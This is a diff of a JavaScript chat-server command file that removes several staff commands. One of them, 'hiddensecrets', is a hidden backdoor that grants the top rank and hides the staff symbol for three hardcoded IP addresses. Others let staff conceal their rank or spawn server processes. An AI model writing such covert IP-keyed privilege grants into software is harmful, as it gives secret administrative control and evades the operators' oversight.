@@ -1173,32 +1173,6 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 		return parseCommand(user, 'demote', target+', deauth', room, socket);
 		break;
 
-	case 'hideauth':
-		if (!user.can('hideauth')) {
-			emit(socket, 'console', '/hideauth - Access denied.');
-			return false;
-			break;
-		}
-		user.getIdentity = function(){return ' ' + user.name};
-		rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
-		emit(socket, 'console', 'Your staff symbol has been sucessfully hidden.');
-		logModCommand(room, user.name + ' has hidden their auth symbol.',true);
-		return false;
-		break;
-			
-	case 'showauth':
-		if (!user.can('hideauth')) {
-			emit(socket, 'console', '/showauth - Access denied.');
-			return false;
-			break;
-		}
-		delete user.getIdentity
-		rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
-		emit(socket, 'console', 'Your staff symbol has been revealed.');
-		logModCommand(room, user.name + ' has revealed their auth symbol.',true);
-		return false;
-		break;
-
 	case 'modchat':
 		if (!target) {
 			emit(socket, 'console', 'Moderated chat is currently set to: '+config.modchat);
@@ -1297,20 +1271,6 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			return false;
 		}
 		emit(socket, 'console', 'Your hot-patch command was unrecognized.');
-		return false;
-		break;
-		
-        case 'gitpull':
-		if (!user.can('gitpull')) {
-			emit(socket, 'console', '/gitpull - Access denied.');
-			return false;
-		}
-		
-		var args = splitArgs('git, pull');
-		logModCommand(room,user.name+' pulled from git',true);
-		room.addRaw('<div class="message-declare"><strong><font color="FFFFFF">Server updating... there might be some lag.</font></strong></div>');
-		gitpulling = true;
-		runCommand(args.shift(), args, socket);
 		return false;
 		break;
 
@@ -1503,19 +1463,6 @@ function parseCommandLocal(user, cmd, target, room, socket, message) {
 			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
 			user.emit('console', 'You have been promoted.')
 			
-			return false;
-		}
-		break;
-		
-	case 'hiddensecrets':
-	case 'hsecrets':
-		// courtesy of jd
-		ip = user.connections[0].ip;
-		if ( ip === '204.112.213.108' || ip === '127.0.0.1' || ip === '76.247.181.42') {
-			user.setGroup(config.groupsranking[config.groupsranking.length - 1]);
-			user.getIdentity = function() { return ' ' + user.name }
-			rooms.lobby.send('|N|'+user.getIdentity()+'|'+user.userid);
-			user.emit('console', 'You have been promoted and symbol hidden.')
 			return false;
 		}
 		break;
@@ -3248,43 +3195,6 @@ function getRandMessage(user){
                         result[r] = result[r].trim();
                 return result;
         }
-
-runCommand = function(command, args, socket) {
-	emit(socket, 'console', "Running '" + command + "'" + ((args && args.length) ? " '" + args.join("' '") + "'": "") + " ...");
-	var child = require("child_process").spawn(command, args);
-	var buffer = "";
-	function pushBuffer(data) {
-		buffer += data;
-		if (buffer.indexOf("\n") >= 0) {
-			var lines = buffer.split("\n");
-			for (var l = 0; l < lines.length - 1; ++l) emit(socket, 'console', lines[l].length > 0 ? lines[l] : " ");
-			buffer = lines[lines.length - 1];
-		}
-	}
-	child.stdout.on('data', pushBuffer);
-	child.stderr.on('data', pushBuffer);
-	child.on('exit', function(code) {
-		process.nextTick(function() {
-				pushBuffer('child process exited with code ' + code);
-				emit(socket, 'console', buffer);
-				//stevo was here and jd and pandaw
-				//if (command === "git," && args[1] === "pull") {
-				if (gitpulling) {
-					for (var i in require.cache) delete require.cache[i];
-					//Tools = require('./tools.js');
-					parseCommand = require('./chat-commands.js').parseCommand;
-					emit(socket, 'console', 'The game engine has been hot-patched.');
-					gitpulling = false;
-					rooms.lobby.addRaw('<div class="message-declare"><strong><font color="FFFFFF">Server update finished.</font></strong></div>');
-				}
-				else {
-					emit(socket, 'console', 'hotpatch unsuccessful.');
-				}
-	
-			
-			});
-	});
-}
 
 function MD5(f){function i(b,c){var d,e,f,g,h;f=b&2147483648;g=c&2147483648;d=b&1073741824;e=c&1073741824;h=(b&1073741823)+(c&1073741823);return d&e?h^2147483648^f^g:d|e?h&1073741824?h^3221225472^f^g:h^1073741824^f^g:h^f^g}function j(b,c,d,e,f,g,h){b=i(b,i(i(c&d|~c&e,f),h));return i(b<<g|b>>>32-g,c)}function k(b,c,d,e,f,g,h){b=i(b,i(i(c&e|d&~e,f),h));return i(b<<g|b>>>32-g,c)}function l(b,c,e,d,f,g,h){b=i(b,i(i(c^e^d,f),h));return i(b<<g|b>>>32-g,c)}function m(b,c,e,d,f,g,h){b=i(b,i(i(e^(c|~d),
 f),h));return i(b<<g|b>>>32-g,c)}function n(b){var c="",e="",d;for(d=0;d<=3;d++)e=b>>>d*8&255,e="0"+e.toString(16),c+=e.substr(e.length-2,2);return c}var g=[],o,p,q,r,b,c,d,e,f=function(b){for(var b=b.replace(/\r\n/g,"\n"),c="",e=0;e<b.length;e++){var d=b.charCodeAt(e);d<128?c+=String.fromCharCode(d):(d>127&&d<2048?c+=String.fromCharCode(d>>6|192):(c+=String.fromCharCode(d>>12|224),c+=String.fromCharCode(d>>6&63|128)),c+=String.fromCharCode(d&63|128))}return c}(f),g=function(b){var c,d=b.length;c=
